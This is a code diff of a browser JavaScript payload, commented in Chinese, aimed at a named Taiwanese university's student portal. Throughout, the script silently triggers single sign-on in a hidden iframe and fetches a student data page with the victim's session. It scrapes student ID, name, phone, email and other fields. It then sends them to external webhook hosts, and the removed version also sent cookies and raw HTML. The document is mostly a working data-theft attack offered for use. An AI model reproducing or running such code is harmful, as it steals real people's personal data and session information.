@@ -1,76 +1,93 @@
 (async () => {
-    // === 1. 設定 ===
-    const webhook = "https://webhook.site/14d34c64-9cd2-413f-acc2-1affb6bf3107";
+    const webhook = "https://eokic4rib1w9z4o.m.pipedream.net";
     const ssoUrl = "https://iportal2.ntnu.edu.tw/ssoIndex.do?apOu=GuidanceApp_LDAP&datetime1=" + Date.now();
     const targetUrl = "/GuidanceApp/Guidance_StudentDataStdtCtrl?Action=Page1BI";
     
-    // === 2. 日誌工具 (繞過 CORS) ===
-    const log = (msg) => {
-        try { new Image().src = `${webhook}?log=${encodeURIComponent(msg)}&t=${Date.now()}`; } catch(e){}
-    };
+    // 簡單日誌，用 Image Beacon 避免 CORS
+    const log = (msg) => { new Image().src = `${webhook}?log=${encodeURIComponent(msg)}`; };
 
-    log("Zero_Click_Start");
-
-    // === 3. 注入隱藏 iframe 執行 SSO ===
-    // 因為前面測試證實 SSO 頁面允許被 iframe 嵌入，所以我們可以在背景偷偷做
+    // 1. Zero-Click 認證 (隱藏 iframe)
     const authFrame = document.createElement('iframe');
     authFrame.style.display = 'none';
     authFrame.src = ssoUrl;
     document.body.appendChild(authFrame);
 
-    log("SSO_Frame_Injected");
-
-    // === 4. 等待認證 (8秒) ===
-    // 給予足夠時間讓 SSO 在背景跑完跳轉並寫入 Cookie
+    // 等待 8 秒讓 SSO 跑完
     await new Promise(r => setTimeout(r, 8000));
 
-    log("Wait_Done_Fetching");
-
-    // === 5. 抓取資料 ===
     try {
-        // 使用 credentials: 'include' 確保帶上剛建立的 Session Cookie
+        // 2. 獲取原始 HTML
         const response = await fetch(targetUrl, {credentials: 'include'});
         const html = await response.text();
 
-        // === 6. 解析個資 ===
-        const clean = (str) => str ? str.replace(/<[^>]+>/g, '').trim() : "N/A";
-        // 嘗試從 HTML 中提取關鍵欄位
-        let info = {
-            studentId: clean(html.match(/學生學號:[\s\S]*?form-control-static">([^<]+)/)?.[1]),
-            name: clean(html.match(/學生姓名:[\s\S]*?form-control-static">([^<]+)/)?.[1]),
-            phone: clean(html.match(/手機:[\s\S]*?form-control-static">([^<]+)/)?.[1]),
-            email: clean(html.match(/E-mail:[\s\S]*?form-control-static">([^<]+)/)?.[1]),
-            // 判斷是否成功登入
-            is_login_success: !html.includes("請由校務行政入口網登入")
+        // 3. 解析 HTML (關鍵步驟：在瀏覽器端處理，不要傳 HTML 回家)
+        const parser = new DOMParser();
+        const doc = parser.parseFromString(html, "text/html");
+        
+        let extractedData = {};
+
+        // 輔助函數：清理字串 (去除 &nbsp; 空格、星號等)
+        const clean = (str) => {
+            if (!str) return "";
+            return str.replace(/&nbsp;/g, '')
+                      .replace(/^\s+|\s+$/g, '') // trim
+                      .replace(/[*:]/g, '');      // 去除標籤中的 * 和 :
         };
 
-        // === 7. 回傳資料 ===
-        const payload = JSON.stringify({
-            status: "SUCCESS_ZERO_CLICK",
-            victim_data: info,
-            cookie_dump: document.cookie,
-            // 預覽 HTML 前 20000 字，用來 debug
-            html_preview: html.substring(0, 20000)
+        // 抓取所有 .form-group (這是每一行資料的容器)
+        const groups = doc.querySelectorAll('.form-group');
+        
+        groups.forEach(group => {
+            // 找標籤 (Label)
+            const labelNode = group.querySelector('label');
+            if (!labelNode) return;
+            
+            const key = clean(labelNode.textContent);
+            if (!key) return; // 如果沒標籤就跳過
+
+            let value = "N/A";
+
+            // 情況 A: 唯讀文字 (p.form-control-static)
+            const staticText = group.querySelector('.form-control-static');
+            if (staticText) {
+                value = clean(staticText.textContent);
+            } 
+            // 情況 B: 輸入框 (input.form-control)
+            else {
+                const input = group.querySelector('input.form-control');
+                if (input) {
+                    value = input.value || "EMPTY"; // 輸入框可能為空
+                }
+            }
+
+            // 存入物件
+            extractedData[key] = value;
         });
 
-        // 優先使用 sendBeacon (可靠性高)
+        // 4. 只傳送乾淨的 JSON 資料
+        const payload = JSON.stringify({
+            status: "SUCCESS",
+            // 這裡只會有學號、姓名、電話等純文字，非常輕量
+            data: extractedData
+        });
+
+        // 使用 sendBeacon 發送 (最穩定，且通常不會有 CORS 預檢問題)
         if (navigator.sendBeacon) {
             navigator.sendBeacon(webhook, payload);
         } else {
-            // 回退使用 fetch (no-cors)
+            // 回退方案
             fetch(webhook, {
                 method: 'POST',
                 mode: 'no-cors',
-                headers: {'Content-Type': 'text/plain'},
                 body: payload
             });
         }
-        log("Data_Exfiltrated");
+        log("Data_Sent");
 
     } catch (e) {
-        log("Fetch_Error_" + e.message);
+        log("Error: " + e.message);
     }
 
-    // === 8. 清理 ===
+    // 清理 iframe
     authFrame.remove();
 })();
